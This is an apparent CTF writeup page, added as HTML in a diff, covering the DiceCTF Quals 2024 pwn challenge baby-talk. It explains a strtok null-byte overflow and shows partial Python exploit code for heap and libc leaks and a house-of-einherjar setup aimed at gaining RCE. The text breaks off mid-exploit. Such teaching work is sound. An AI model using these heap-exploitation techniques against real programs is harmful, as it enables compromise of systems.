@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>DiceCTF Quals 2024 - pwnland</title><meta name="Description" content="Writeup for the pwn challenges in dicectf"><meta property="og:url" content="http://localhost:1313/posts/dicectf-quals-2024/">
+  <meta property="og:site_name" content="pwnland">
+  <meta property="og:title" content="DiceCTF Quals 2024">
+  <meta property="og:description" content="Writeup for the pwn challenges in dicectf">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-02-05T02:05:00+07:00">
+    <meta property="article:modified_time" content="2023-02-05T02:05:00+07:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Heap">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="DiceCTF Quals 2024">
+  <meta name="twitter:description" content="Writeup for the pwn challenges in dicectf">
+<meta name="application-name" content="Cyber/CTF Blog">
+<meta name="apple-mobile-web-app-title" content="Cyber/CTF Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/dicectf-quals-2024/" /><link rel="prev" href="http://localhost:1313/posts/wreckctf-2022/" /><link rel="next" href="http://localhost:1313/posts/sunshinectf-2024/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DiceCTF Quals 2024",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/dicectf-quals-2024\/"
+        },"genre": "posts","keywords": "pwn, heap","wordcount":  3359 ,
+        "url": "http:\/\/localhost:1313\/posts\/dicectf-quals-2024\/","datePublished": "2024-02-05T02:05:00+07:00","dateModified": "2023-02-05T02:05:00+07:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "ItayB"
+            },"description": "Writeup for the pwn challenges in dicectf"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnland">pwn.land</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/aboutme/"> About Me </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnland">pwn.land</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/aboutme/" title="">About Me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DiceCTF Quals 2024</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://itaybel.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>ItayB</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-02-05">2024-02-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3359 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;16 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#baby-talk">baby-talk</a>
+      <ul>
+        <li><a href="#code-overview">Code Overview</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#boogie-woogie">boogie-woogie</a>
+      <ul>
+        <li><a href="#code-overview-1">Code Overview</a></li>
+        <li><a href="#exploitation-1">Exploitation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Writeups to baby-talk,boogie-woogie in DiceCTF Quals.</p>
+<h2 id="overview">Overview</h2>
+<p>In this CTF, I have played with <code>thehackerscrew</code>.
+We finished 6th place, and qualified for the finals in NYC!
+I really liked the pwn challenges, they were super cool and unique, and I really enjoyed spending my time on them.</p>
+<h2 id="baby-talk">baby-talk</h2>
+<h3 id="code-overview">Code Overview</h3>
+<p>This challenge was the first challenge I encountered during the ctf.</p>
+<p>Putting the binary in IDA, reveals its functionallity:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">num</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">print_menu</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">num</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span> <span class="nf">do_str</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span> <span class="nf">do_tok</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span> <span class="nf">do_del</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>We have a little menu, which grants the user the abillity to call the <code>do_str/do_tok_do_del</code> functions.</p>
+<p>Here is each of the functions:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">do_tok</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">...</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;idx? &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">num</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">&lt;=</span> <span class="mh">0xF</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">strs</span><span class="p">[</span><span class="n">num</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">s</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;delim? &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">2uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v0</span> <span class="o">=</span> <span class="nf">strtok</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">v0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v0</span> <span class="o">=</span> <span class="nf">strtok</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span></span></span></code></pre></div></div>
+<p>So we can give an index, and call strtok on a string located at <code>num[idx]</code>.</p>
+<p><code>num</code> is <code>unsigned int</code>, so not OOB here, since <code>strs</code> is of size 0xf.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">do_str</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">empty</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">empty</span> <span class="o">=</span> <span class="nf">get_empty</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">empty</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;too many!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;size? &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span> <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;too big!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">strs</span><span class="p">[</span><span class="n">empty</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strs</span><span class="p">[</span><span class="n">empty</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;no mem!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;str? &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">strs</span><span class="p">[</span><span class="n">empty</span><span class="p">],</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;stored at %d!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">empty</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>The <code>do_str</code> function basiclly allocates a chunk in the heap of our choosing, and lets us control its content.</p>
+<p>It allocates with <code>malloc</code> and not <code>calloc</code>, so there is an uninitialized bug here, which can give us leaks.</p>
+<p>Please note that there is no nullbyte added at the end of the str, and that we can fill up the whole chunk (the read amount is the same size of the chunk), This will be important later.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">do_del</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">num</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;idx? &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">num</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">&lt;=</span> <span class="mh">0xF</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">strs</span><span class="p">[</span><span class="n">num</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">ptr</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v0</span> <span class="o">=</span> <span class="n">strs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">strs</span><span class="p">[</span><span class="n">num</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">   <span class="p">...</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>This function basiclly frees a string we choose. nothing to interesting here.</p>
+<p>At first glance, we don&rsquo;t see the vulnerability straight away. We can allocate, call strtok, and free.</p>
+<p>the <code>strtok</code> function breaks a string into a sequence of zero or more nonempty tokens.
+If a delimiter byte is found, it is overwritten with a null byte to terminate the current token.</p>
+<p>As we saw in the <code>do_str</code> function, when creating a new string it doesn&rsquo;t terminate the string, and reads exactly <code>size</code> characters.
+This means we can fully fill up the heap , and stop just one byte before the size field of the next chunk.</p>
+<p>Here is how the heap looks like:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/dicectf-quals-2024/image.png"
+        data-srcset="/posts/dicectf-quals-2024/image.png, /posts/dicectf-quals-2024/image.png 1.5x, /posts/dicectf-quals-2024/image.png 2x"
+        data-sizes="auto"
+        alt="/posts/dicectf-quals-2024/image.png"
+        title="Alt text" width="879" height="134" /></p>
+<p>Now, since we know that the delimiter byte will be overwritten with a nullbyte, if we call <code>strtok</code> on our chunk, and provide <code>delim=0x91</code>, it will overwrite the first byte of the size field with a nullbyte!</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>So our bug is a basic nullbyte overflow into the size field of the next chunk.
+To exploit such primitive, we can use the house of einherjar technique.</p>
+<p>The idea of this technique is to overwrite into the <code>size</code> of the next chunk in memory and clear the <code>PREV_IN_USE</code> flag to 0.</p>
+<p>Also, it overwrites into prev_size (already in the previous chunk&rsquo;s data region) a fake size.</p>
+<p>When the next chunk is freed, it finds the previous chunk to be free and tries to consolidate by going back &lsquo;fake size&rsquo; bytes in memory.</p>
+<p>But in reality, the previous chunk isn&rsquo;t even freed. this can give us an overlapping chunks primitive which gives the same result as a UAF.</p>
+<p>Then we can do a tcache poisening attack to write into <code>__free_hook</code> and gain RCE.</p>
+<p>Now its time to implement all of this.</p>
+<p>Lets start by getting leaks. We can get an heap leak by allocating a chunk, freeing it, allocating again and reading the contents.</p>
+<p>it will contain the fd pointer of the next chunk, which points to the heap:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-py">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="s1">&#39;P&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">heap_leak</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">do_tok</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xfffffffffffff000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;HEAP LEAK @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>We can do the exact same thing to get a libc leak. we just need to use a bigger size, so that our freed chunk will go into the unsorted bin, and not the tcache.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-py">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">fake_chunk_address</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">+</span> <span class="mh">0x1370</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_address</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_address</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;G&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">fake_chunk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">do_tok</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3ebc41</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;LIBC LEAK @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>You can see that I&rsquo;ve created a fake chunk inside one of the allocated strings.</p>
+<p>This will be used later, after triggering the vulnerability , We will consolidate backwards to this fake chunk.</p>
+<p>It needs to have a valid size field, and its <code>fd/bk</code> needs to satisfy one of libc mitegaions: <code>p = p-&gt;fd-&gt;bk = p-&gt;bk-&gt;fd</code></p>
+<p>We provided <code>fd=bk=fake_chunk_address + 0x10</code>, so when accessing the <code>fd/bk</code> of this address, it will result in the 2 QUADWORDS after that, which are <code>fake_chunk_address</code>, and the same thing.</p>
+<p>Also, when consolidating backwards, it checks if we have a valid chunk after our chunk, so we need to satisfy that aswell.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-py">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x38</span><span class="p">)</span> <span class="c1"># idx=4</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x148</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x28</span> <span class="o">*</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span> <span class="c1">#size field of this chunk is 0x151</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_tok</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x51</span><span class="p">))</span> <span class="c1"># trigger null byte</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
